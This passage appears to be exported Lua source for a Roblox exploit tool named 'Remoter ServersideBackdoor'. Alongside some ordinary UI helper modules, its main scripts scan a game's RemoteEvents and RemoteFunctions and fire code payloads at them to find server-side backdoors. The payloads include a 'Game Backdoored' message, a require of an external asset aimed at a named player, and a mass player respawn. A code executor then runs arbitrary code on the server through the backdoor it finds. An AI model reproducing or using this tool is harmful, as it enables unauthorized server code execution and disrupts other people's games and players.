	██║░░██║███████╗██████╔╝╚██████╔╝██║░░░░░╚█████╔╝██║░╚███║██████╔╝██║░░██║██║██████╦╝╚██████╔╝
	╚═╝░░╚═╝╚══════╝╚═════╝░░╚═════╝░╚═╝░░░░░░╚════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░░╚═════╝░
	-- V1.0.0
	
	// 自動スクリーンスケーラー \\
	
	-- ._.l5 の Discord
	-- 0_6lI の Roblox

	サーバーによって作成されたレスポンシブモジュール
]]

		local Resuponshibu = {}
		Resuponshibu.__index = Resuponshibu

		function Resuponshibu.new()
			local self = setmetatable({}, Resuponshibu)

			self.Services = {
				RunService = game:GetService("RunService"),
				TweenService = game:GetService("TweenService"),
			}

			self._scale = Instance.new("UIScale")
			self._connection = nil
			self._startChangeSize = 0
			self._smoothChange = false

			return self
		end

		function Resuponshibu:Set(gui, startChangeSize, smooth : boolean?)
			--assert(gui:IsA("GuiObject"), "Argument 'gui' must be a valid GUI object.")

			self._scale.Parent = gui
			self._scale.Name = "@Resuponshiburendaringu"

			self._startChangeSize = startChangeSize
			self._smoothChange = smooth

			if self._connection then
				self._connection:Disconnect()
			end

			self._connection = self.Services.RunService.RenderStepped:Connect(function()
				self:_update()
			end)
		end

		function Resuponshibu:Destroy()
			if self._connection then
				self._connection:Disconnect()
				self._connection = nil
			end

			self._scale.Parent = nil
			self._scale:Destroy()
		end

		function Resuponshibu:_update()
			local cam = workspace.CurrentCamera
			if not cam then return end

			local vps = cam.ViewportSize
			local newScale = 0

			newScale = (vps.X + vps.Y)/self._startChangeSize
			if newScale >= 1 then
				newScale = 1
			end

			if self._smoothChange then
				self:_tween(self._scale, TweenInfo.new(.25), {Scale = newScale})
			else
				self._scale.Scale = newScale
			end
		end

		function Resuponshibu:_tween(object, info, goal)
			local tween = self.Services.TweenService:Create(object, info, goal)
			tween:Play()
			return tween
		end

		return Resuponshibu
	end;
};
G2L_MODULES[G2L["72"]] = {
	Closure = function()
		local script = G2L["72"];--!strict
		--!native

--[[
	SecureEnvironment ModuleScript
	By: @V3N0M_Z
	Last Updated: 10/2/18
	Contributors: @c4s4h
	
	- This script is old, mean't to be before the FE update
	- This script is meant to be used to secure your environment from exploiters
]]

		local SecureEnv = {}
		SecureEnv.__index = SecureEnv

		----------------
		--* Services *--
		----------------

		local RunService = game:GetService("RunService")
		local LogService = game:GetService("LogService")

		----------------
		--* Settings *--
		----------------

		local DEBUG_MODE = true -- Logs stuff to the output
		local HIDE_PROTECTION = true -- Hides key requests

		-------------------------------------------------------
		--* Renewable variables just in case of deprecation *--
		-------------------------------------------------------

		local script = script
		local warn = warn
		local type = type

		----------------------
		--* Main variables *--
		----------------------

		local config = script:WaitForChild("Configuration")

		-----------------------------------------
		--* Constructer for running SecureEnv *--
		-----------------------------------------

		math.randomseed(os.time())

		function SecureEnv.new()
			local self = setmetatable({}, SecureEnv)

			-- Important Envs or environments that are needed for SecureEnv
			self.ImportantEnvs = {
				GetEnv = nil,
				SecretEnv = nil,
				NumberService = nil,
				SecureLocation = nil,
			}

			-- Used for faking Env to trick serverside exploiters
			self._fakeENV = {}

			-- Used for creating a fake environment
			self.createNewEnv = function()
				local envTable = {}

				function envTable:FindFirstChild(obj)
					return config.Parent:FindFirstChild(obj)
				end
				function envTable:WaitForChild(obj)
					if envTable[obj] then
						return envTable[obj] else
						return config.Parent:WaitForChild(obj)
					end
				end

				self._fakeENV = envTable

				return self._fakeENV
			end

			-- Can change the environment to desired environment or create a new one
			self.changeENV = function(key, value)
				if not key then
					return "No key found, fallback."
				end

				if type(key) == "string" then
					local newEnv = self.createNewEnv()
					newEnv[key] = value

					if script:FindFirstChild(key) then
						script = newEnv
						return newEnv
					else
						warn("No env module found! Please try and use a key that is available.")
					end
				end

				return nil
			end

			-- Creates a random string for the encryption.
			self.randomString = function(length)
				local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
				local result = {}

				for i = 1, length do
					local randIndex = math.random(1, #charset)
					result[i] = charset:sub(randIndex, randIndex)
				end

				return table.concat(result)
			end

			-- Used to hide exploiter's logged scripts
			self.hideLogged = function()
				if not DEBUG_MODE then
					if not HIDE_PROTECTION then return end

					local output = ""

					local amount = RunService:IsStudio() and 5 or 500
					for i = 1, amount do
						output = output .. "\n"
					end

					print(output)

					LogService:ClearOutput()
				end
			end

			-- Spams the output for better environment protection. Acts as a required module to trick exploiters that their module is working but actually isn't
			-- This is for the hackers that depend on the output to be working.
			-- The reason why it is CoreGui is because hackers use that to inject most of their scripts
			self.spamOutput = function()
				task.spawn(function()
					if not HIDE_PROTECTION then return end

					local numSpam = RunService:IsStudio() and math.random(5, 10) or math.random(20, 100)

					local fakes = {
						98209510964507, 100263845596551, 98127928345586, 101429116275184, 132748826495745, 123255432303221, 95474553587929,
						78790302691160, 93645353452117, 112945327108627, 16534611190, 80471542788138, 84989778142762, 57375682226697,
						126530755465022, 1847272874724, 7192763922, 87988504886084, 98169651229062, 11371945115, 85380043749737,
						97916698791205, 111093930782644, 116418844690268, 112281916532614, 140415515292057, 124559027937191,
						99443379334014,
					}

					self.hideLogged()
					for index = 1, numSpam do
						local randomNumber = fakes[math.random(1, #fakes)]

						local localPlayer = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]

						print(
							string.format([[Requiring asset %s.
Callstack:
required_asset_100486349623492.MainModule..MainModule.RemoteEvent.LocalScript.Libraries.Interpreter, line 904 - luau_execute
Players.%s.PlayerGui.GuiTemp.Scripts.Modules.SecureEnv, line 233
Players.%s.PlayerGui.GuiTemp.Scripts.Modules.SecureEnv, line 232 - EnvRun
Players.%s.PlayerGui.GuiTemp.Scripts.Server, line 14]]
								, tostring(randomNumber), localPlayer.Name, localPlayer.Name, localPlayer.Name
							)
						)
					end
					self.hideLogged()
				end)
			end

			return self
		end

		--* Static functions *--
		--********************--

		----------------------------------------
		--* Creates a new secure environment *--
		----------------------------------------

		function SecureEnv:NewEnv(newKey)
			-- Checks if key is a number, otherwise it'll be invalid.
			if type(newKey) ~= "number" then
				warn(`Key must be a number, got {type(newKey)}`)
				return
			end

			-- Begin the hiding of the key.
			self.hideLogged()

			-- Starts creating the new environment with encrypted key.
			local newEnv = self.changeENV(config.NewEnv.Value, newKey)

			-- Returns the new environment handler and new environment.
			local newEnvHandler = require(script:WaitForChild("EnvironmentHandler"))

			-- Hide the logged key.
			self.hideLogged()

			return newEnvHandler, newEnv
		end

		----------------------------------------------------------------------------------------------------------
		--* Used for running secret environments with string keys to confuse exploiters with serverside access *--
		----------------------------------------------------------------------------------------------------------

		function SecureEnv:EnvRun(secretKey, customConfig)
			-- Checks if key is a string, otherwise it'll be invalid.
			if type(secretKey) ~= "string" then
				warn(`Key must be a string, got {type(secretKey)}`)
				return
			end

			-- If there isn't a secret environment, then it'll create one.
			if not self.ImportantEnvs.SecretEnv then
				self.ImportantEnvs.SecretEnv = self:NewEnv(config.EnvRun.MaxValue)
			end

			-- Configuration for secret environment.
			local envConfig = customConfig or {
				RunContext = RunService:IsServer() and Enum.RunContext.Server or Enum.RunContext.Client,
				Convert = false,
			}
			envConfig["Contents"] = secretKey

			-- Checks if the result is valid, otherwise it'll return nil and be non-successful.
			self.spamOutput()
			local success, keyResult = pcall(function()
				return self.ImportantEnvs.SecretEnv(envConfig)()
			end)
			self.spamOutput()

			-- Returns values
			return success, keyResult
		end

		---------------------------------------------
		--* Usually used for creating secret keys *--
		---------------------------------------------

		function SecureEnv:SecureNum(num)
			-- If there isn't a GetEnv environment, then it'll create one.
			if not self.ImportantEnvs.GetEnv then
				self.ImportantEnvs.GetEnv = self:NewEnv(config.SecureNum.MaxValue)
			end
			if not self.ImportantEnvs.NumberService then
				self.ImportantEnvs.NumberService = self:NewEnv(config.NumberService.MaxValue)
			end

			-- Encoded values for encrypted functions for security.
			local encoded = self.ImportantEnvs.NumberService:GetEncoded()

			-- Creates a table for the functions.
			local funcs = {}

			-- Defines the functions for getting the values.
			funcs.WrapNumber = self.ImportantEnvs.GetEnv[encoded.NumberWrapper]
			funcs.EncryptNumber = self.ImportantEnvs.GetEnv[encoded.NumberEncrypter]

			-- Declares the newNumber value nil until it's created.
			local newNumber = nil
			if funcs.WrapNumber and funcs.EncryptNumber then
				local success, result = pcall(function()
					newNumber = funcs.WrapNumber(self.ImportantEnvs.GetEnv, num)
				end)
				if success then
					newNumber.Name = self.randomString(15)
					funcs.EncryptNumber(self.ImportantEnvs.GetEnv, newNumber)
				else
					local success, result = pcall(function()
						newNumber = self:NewEnv(num)
					end)
					if not success then
						newNumber = self.ImportantEnvs.NumberService:StartBackupConversion(num)
					end
				end
			end

			return newNumber
		end

		--------------------------------------------------------------------
		--* Used to secure your script to prevent deletion by exploiters *--
		--------------------------------------------------------------------

		function SecureEnv:ProtectScript(scriptObj)
			if not self.ImportantEnvs.SecureLocation then
				self.ImportantEnvs.SecureLocation = self:NewEnv(config.SecureLocation.MaxValue)
			end

			self.ImportantEnvs.SecureLocation:Secure(scriptObj)
		end

		return SecureEnv
	end;
};
G2L_MODULES[G2L["73"]] = {
	Closure = function()
		local script = G2L["73"];local EnvHandler = {}
		EnvHandler.__index = EnvHandler

		function EnvHandler.new(globalEnv)
			local self = setmetatable({}, EnvHandler)

			self._globalEnv = globalEnv
			self._newEnv = setmetatable({}, {__index = self._globalEnv})

			return self
		end

		function EnvHandler:SetNewEnv(newEnv)
			self._newEnv = newEnv
			return self._newEnv
		end

		return EnvHandler
	end;
};
-- StarterGui.Remoter ServersideBackdoor.Interface.Main.UIDrag
local function C_4()
	local script = G2L["4"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.Remoter ServersideBackdoor.Interface.Main.MainAPI
local function C_5()
	local script = G2L["5"];
	local buttons = {
		Exe = script.Parent.Content.Executor.Buttons.Execute;
		clear = script.Parent.Content.Executor.Buttons.Clear;
		connect = script.Parent.Top.Connect;
	}


	local codeBar = script.Parent.Content.Executor.Codebox:WaitForChild("Textbox"):WaitForChild("Main"):WaitForChild("Textbox"):WaitForChild("Input")



	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "remoter_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end


		local testId = "remoter_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
				local m = Instance.new("Folder")
				m.Name = "%s"
				m.Parent = game:GetService("ReplicatedStorage")
			]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local RE = [[
			local m = Instance.new("Message", game.Workspace)
			m.Text = "Remoter Serverside On top !!"
			wait(4)
			m:Destroy()
			]]








		local Hint = [[
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Remoter Serverside !! gg/W5bNxXf85r --- fastest backdoor executor"
			
			while true do
				wait(5)
				hint:Destroy()
				wait(5)
				local hint = Instance.new("Hint", game.Workspace)
				hint.Text = "Game Backdoored by Remoter Serverside !! gg/W5bNxXf85r --- fastest backdoor executor"
			end
			]]




		pcall(function()
			if isFunction then
				task.spawn(function() 
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("remoterTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("remoterTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)

		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Remoter: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 1
			local checkInterval = 1 or 3
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("Remoter: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("Remoter: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("remoterTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "Remoter",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "Remoter",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				buttons.connect.Text = "Not Infected!"
				buttons.connect.TextScaled = true
				StarterGui:SetCore("SendNotification", {
					Title = "Remoter Serverside",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end

	buttons.connect.MouseButton1Click:Connect(function()
		buttons.connect.Text = "Infecting!"
		buttons.connect.TextScaled = false
		StarterGui:SetCore("SendNotification", {
			Title = "Remoter Serverside",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("Remoter: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))

			if foundExploit then
				local formattedTime = string.format("%.2f", timeToFindExploit)
				buttons.connect.Text = "Infected!"
				buttons.connect.TextScaled = false
				StarterGui:SetCore("SendNotification", {
					Title = "Remoter",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				buttons.connect.Text = "Not Infected!"
				buttons.connect.TextScaled = true
				StarterGui:SetCore("SendNotification", {
					Title = "Remoter",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)

	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)

	updateExeButton()
end;
task.spawn(C_5);
-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.LocalScript
local function C_13()
	local script = G2L["13"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "remoter_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "remoter_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
				local m = Instance.new("Folder")
				m.Name = "%s"
				m.Parent = game:GetService("ReplicatedStorage")
			]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("remoterTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("remoterTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Remoter: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("Remoter: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("Remoter: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("Remoter: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_13);
-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.LocalScript
local function C_19()
	local script = G2L["19"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "remoter_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "remoter_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
				local m = Instance.new("Folder")
				m.Name = "%s"
				m.Parent = game:GetService("ReplicatedStorage")
			]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local player = game.Players.LocalPlayer
		local payloading = [[
			for _, lol in pairs(game.Players:GetPlayers()) do
				lol:LoadCharacter()
			end
			]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("remoterTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("remoterTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Remoter: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("Remoter: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("Remoter: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("Remoter: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_19);
-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide.LocalScript
local function C_32()
	local script = G2L["32"];
	local eyeopen = 'rbxassetid://80089904565730'
	local eyeclose = 'rbxassetid://91515864926349'

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Icon.Image == eyeclose then
			script.Parent.Icon.Image = eyeopen
		else
			script.Parent.Icon.Image = eyeclose
		end
	end)
end;
task.spawn(C_32);
-- StarterGui.Remoter ServersideBackdoor.Scripts.Core
local function C_37()
	local script = G2L["37"];
	local scripts = script.Parent
	local modules = scripts:WaitForChild("Modules")
	local gui = scripts.Parent
	local interface = gui:WaitForChild("Interface")

	local TweenService = game:GetService("TweenService")

	local main = interface:WaitForChild("Main")
	local content = main:WaitForChild("Content")

	local tabs = {
		Executor = content:WaitForChild("Executor"),
	}
	local states = {
		Hidden = false,
	}
	local tabContent = {}
	local mainTabSession = {}

	local numTabs = 0

	local kodobokkusu = require(modules:WaitForChild("Kodobokkusu"))
	local tabControl = require(modules:WaitForChild("TabControl"))
	local resuponshibu = require(modules:WaitForChild("Resuponshibu")).new()

	local function newSpawn(func, canDebug)
		if canDebug then
			task.spawn(func) else
			task.spawn(pcall, func)
		end
	end
	local function tween(obj, info, goal)
		local tween = TweenService:Create(obj, info, goal):Play()
		return tween
	end

	-- Module setup
	resuponshibu:Set(gui, 1600)

	-- Executor
	newSpawn(function()
		local page = tabs.Executor

		local textbox = kodobokkusu.new({
			Parent = page.Codebox,
		})
		local tabHandler = tabControl.new()

		textbox:ChangeTheme({
			THEME_COLOR = Color3.fromRGB(255, 255, 255),

			LINE_NUMBER_HIGHLIGHT_TRANSPARENCY = "none",
			LINE_HIGHLIGHTER_OUTLINE_TRANSPARENCY = .5,

			CURSOR_INACTIVE_TRANSPARENCY = 1,

			LINES_X_SIZE = 10,

			DARK_BACKGROUND = Color3.fromRGB(0, 0, 0),
		})

		local function removeTab(tabTable)
			numTabs -= 1

			tabHandler:SwitchTab(mainTabSession)

			if tabTable.Temp then
				tabTable.Temp:Destroy()
				tabTable.Temp = nil
			end
			if tabTable.Conn then
				tabTable.Conn:Disconnect()
				tabTable.Conn = nil
			end
			table.remove(tabContent, tabTable.uniqueId)
		end
		local function addTab()
			numTabs += 1

			local uniqueId = math.random()

			local selected = false

			local temp = script:WaitForChild("TabTemp"):Clone()
			temp.Parent = page.Tabs
			temp.Name = `Tab {numTabs}`

			local tabInfo = {
				String = `print("Hello world!")`,
				Temp = temp,

				Conn = textbox:GetPropertyChangedSignal("Text"):Connect(function()
					if selected and temp then
						tabContent[uniqueId].String = textbox:GetText()
					end
				end),

				uniqueId = uniqueId,
			}

			if numTabs <= 1 then
				temp.Name = "0 Main Tab"
				temp.Text = "Main Tab"
				temp.Close.Visible = false
			else
				temp.Name = `Tab {numTabs - 1}`
				temp.Text = temp.Name
				temp.Close.Activated:Connect(function()
					removeTab(tabInfo)
				end)
			end

			tabContent[uniqueId] = tabInfo

			local session = tabHandler:AddTab(temp, uniqueId, function()
				if tabContent[uniqueId] then
					tween(temp, TweenInfo.new(.25), {TextColor3 = Color3.fromRGB(255, 255, 255)})
					tween(temp.Underline, TweenInfo.new(.25), {Size = UDim2.new(1, 10, 0, 1)})

					selected = true

					textbox:Write(tabContent[uniqueId].String)
				end
			end, function()
				if tabContent[uniqueId] then
					tween(temp, TweenInfo.new(.25), {TextColor3 = Color3.fromRGB(150, 150, 150)})
					tween(temp.Underline, TweenInfo.new(.25), {Size = UDim2.new(0, 0, 0, 1)})

					selected = false
				end
			end)
			if numTabs <= 1 then
				mainTabSession = session
			end
			tabHandler:SwitchTab(session)
		end
		addTab()

